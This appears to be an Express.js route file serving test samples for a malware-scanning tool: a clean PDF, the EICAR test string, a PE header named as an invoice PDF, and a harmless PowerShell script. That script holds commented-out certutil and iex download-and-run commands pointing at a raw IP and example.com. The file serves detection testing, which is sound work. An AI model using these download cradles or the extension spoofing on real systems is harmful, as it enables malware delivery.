import express from 'express';

const router = express.Router();

// Safe EICAR standard antivirus test string (benign ASCII file recognized by all AV engines)
const EICAR_TEST_STRING = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

// Clean minimal valid PDF
const CLEAN_PDF = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(ANVESH Clean PDF Test) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000202 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
297
%%EOF`;

// Safe Windows PE dummy binary (DOS MZ + PE signature) named invoice.pdf to trigger extension spoofing
function createDummyPEBuffer() {
  const buf = Buffer.alloc(512, 0);
  // 'MZ' at 0x00
  buf[0] = 0x4d;
  buf[1] = 0x5a;
  // e_lfanew at 0x3C pointing to 0x80
  buf.writeUInt32LE(0x80, 0x3c);
  // 'PE\0\0' at 0x80
  buf[0x80] = 0x50;
  buf[0x81] = 0x45;
  buf[0x82] = 0x00;
  buf[0x83] = 0x00;
  // Machine i386 (0x014c)
  buf.writeUInt16LE(0x014c, 0x84);
  // Number of sections: 1
  buf.writeUInt16LE(1, 0x86);
  // Optional header size: 0
  buf.writeUInt16LE(0, 0x94);
  // Section Header '.text' at 0x80 + 24 = 0x98
  Buffer.from('.text\0\0\0').copy(buf, 0x98);
  return buf;
}

// Suspicious script with harmless LOLBins and base64 string
const SUSPICIOUS_SCRIPT = `# ANVESH Static Heuristic Test Script (Harmless Educational Demonstration)
# This script does not execute malicious payloads, but demonstrates static pattern recognition.
Write-Host "Demonstrating heuristic detection patterns..."

# Suspicious living-off-the-land pattern (Certutil download)
# certutil.exe -urlcache -f http://185.220.101.5/payload.bin temp.bin

# Suspicious base64 obfuscation pattern
$encodedPayload = "V3JpdGUtSG9zdCAiSGFybWxlc3MgVGVzdCBQYXlsb2FkIGZvciBBTlZFU0ggQW5hbHlzaXMiCg=="
# Invoke-Expression (iex) pattern
# iex (New-Object Net.WebClient).DownloadString('http://example.com/test')
Write-Host "Test complete."
`;

router.get('/samples', (req, res) => {
  res.json({
    samples: [
      {
        id: 'clean-pdf',
        name: 'sample_clean_document.pdf',
        description: 'Clean, benign PDF file with normal structure and no dangerous tags.',
        expectedVerdict: 'LOW / SAFE RISK',
        type: 'application/pdf'
      },
      {
        id: 'extension-mismatch',
        name: 'urgent_invoice_october.pdf',
        description: 'Extension spoofing demonstration: File is named .pdf, but contains Windows PE binary header.',
        expectedVerdict: 'HIGH RISK (Extension Spoofing)',
        type: 'application/pdf'
      },
      {
        id: 'eicar-test',
        name: 'eicar_antivirus_test.com',
        description: 'Industry-standard benign EICAR antivirus test file recognized by all AV engines without containing malware.',
        expectedVerdict: 'CRITICAL (Signature Match)',
        type: 'text/plain'
      },
      {
        id: 'suspicious-script',
        name: 'suspicious_downloader.ps1',
        description: 'Harmless PowerShell test script containing static indicators (LOLBin, base64 payload pattern, IEX).',
        expectedVerdict: 'MEDIUM / HIGH RISK (Static Heuristic)',
        type: 'text/plain'
      }
    ]
  });
});

router.get('/samples/download/:id', (req, res) => {
  const { id } = req.params;

  if (id === 'clean-pdf') {
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="sample_clean_document.pdf"');
    return res.send(Buffer.from(CLEAN_PDF, 'utf8'));
  }

  if (id === 'extension-mismatch') {
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="urgent_invoice_october.pdf"');
    return res.send(createDummyPEBuffer());
  }

  if (id === 'eicar-test') {
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="eicar_antivirus_test.com"');
    return res.send(Buffer.from(EICAR_TEST_STRING, 'utf8'));
  }

  if (id === 'suspicious-script') {
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="suspicious_downloader.ps1"');
    return res.send(Buffer.from(SUSPICIOUS_SCRIPT, 'utf8'));
  }

  return res.status(404).json({ error: 'Sample not found' });
});

export default router;
